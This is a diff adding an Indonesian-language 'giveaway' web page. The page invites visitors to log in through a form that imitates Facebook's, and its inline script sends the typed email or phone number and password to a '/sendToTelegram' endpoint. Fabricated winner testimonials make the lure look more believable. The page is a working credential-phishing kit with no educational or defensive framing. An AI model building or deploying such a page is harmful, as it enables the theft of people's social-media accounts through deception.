@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Giveaway</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        /* CSS Inline untuk feedback */
+        #feedback {
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="logo">Giveaway</div>
+        <nav>
+            <ul>
+                <li><a href="#">Beranda</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <h1>Ikuti Giveaway Menarik Kami!</h1>
+        <p>Dapatkan kesempatan memenangkan hadiah luar biasa.</p>
+    </section>
+
+    <!-- Prize Section -->
+    <section class="prizes">
+        <h2>Hadiah Utama</h2>
+        <div class="prize-list">
+            <div class="prize-item">
+                <img src="asset/prize1.jpg" alt="Hadiah 1">
+                <p>Hadiah 1</p>
+            </div>
+            <div class="prize-item">
+                <img src="asset/prize2.jpg" alt="Hadiah 2">
+                <p>Hadiah 2</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Call to Action Section -->
+    <!-- Call to Action Section -->
+    <section class="cta-section">
+        <p style="font-size: 18px; color: #333; margin-bottom: 10px;">
+            Dan masih banyak hadiah menarik lainya.<br>
+            Jangan lewatkan kesempatan ini!<br>
+            Untuk ikut serta, silakan masuk dengan akun Anda di bawah ini.
+        </p>
+        <a href="#loginForm" class="cta-btn-secondary">Masuk Sekarang</a>
+    </section>
+
+
+    <!-- Login Section -->
+    <section class="login-section">
+        <div class="login-container">
+            <h2 translate="no">Facebook</h2>
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Email atau Telepon" required>
+                <input type="password" id="password" placeholder="Kata Sandi" required>
+                <button type="submit">Masuk</button>
+            </form>
+            <div class="forgot-password">Lupa kata sandi?</div>
+            <div id="feedback"></div> <!-- Umpan balik di sini -->
+        </div>
+    </section>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const feedback = document.getElementById('feedback');
+
+            fetch('/sendToTelegram', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ username, password }),
+            }).then(response => {
+                if (response.ok) {
+                    feedback.textContent = 'Data berhasil dikirim!';
+                    feedback.style.color = 'green';
+                } else {
+                    feedback.textContent = 'Terjadi kesalahan saat mengirim data!';
+                    feedback.style.color = 'red';
+                }
+                feedback.style.display = 'block';
+            }).catch(error => {
+                feedback.textContent = 'Terjadi kesalahan: ' + error.message;
+                feedback.style.color = 'red';
+                feedback.style.display = 'block';
+            });
+        });
+    </script>
+
+    <!-- Comments Section -->
+    <section class="comments">
+        <h2>Komentar Pemenang</h2>
+        <div class="comment-list">
+            <div class="comment-item">
+                <div class="comment-profile">
+                    <img src="asset/profile1.jpg" alt="Foto Profil Adi">
+                </div>
+                <div class="comment-content">
+                    <p><strong>Adi:</strong> Saya sangat senang! Tidak percaya saya menang hadiah utama.</p>
+                    <p class="comment-time">10 Agustus 2024, 14:32</p>
+                    <div class="comment-actions">
+                        <span class="like-icon">👍</span>
+                        <span class="unlike-icon">👎</span>
+                    </div>
+                </div>
+            </div>
+            <div class="comment-item">
+                <div class="comment-profile">
+                    <img src="asset/profile2.jpg" alt="Foto Profil Siti">
+                </div>
+                <div class="comment-content">
+                    <p><strong>Siti:</strong> Terima kasih! Saya berhasil mendapatkan hadiah yang luar biasa!</p>
+                    <p class="comment-time">11 Agustus 2024, 09:15</p>
+                    <div class="comment-actions">
+                        <span class="like-icon">👍</span>
+                        <span class="unlike-icon">👎</span>
+                    </div>
+                </div>
+            </div>
+            <div class="comment-item">
+                <div class="comment-profile">
+                    <img src="asset/profile3.jpg" alt="Foto Profil Budi">
+                </div>
+                <div class="comment-content">
+                    <p><strong>Budi:</strong> Giveaway ini sangat keren, saya berhasil memenangkan hadiah menarik.</p>
+                    <p class="comment-time">12 Agustus 2024, 16:45</p>
+                    <div class="comment-actions">
+                        <span class="like-icon">👍</span>
+                        <span class="unlike-icon">👎</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <p>Hubungi kami: email@contoh.com | Ikuti kami di media sosial</p>
+        <p>&copy; 2024 Giveaway. Semua hak dilindungi.</p>
+    </footer>
+</body>
+</html>
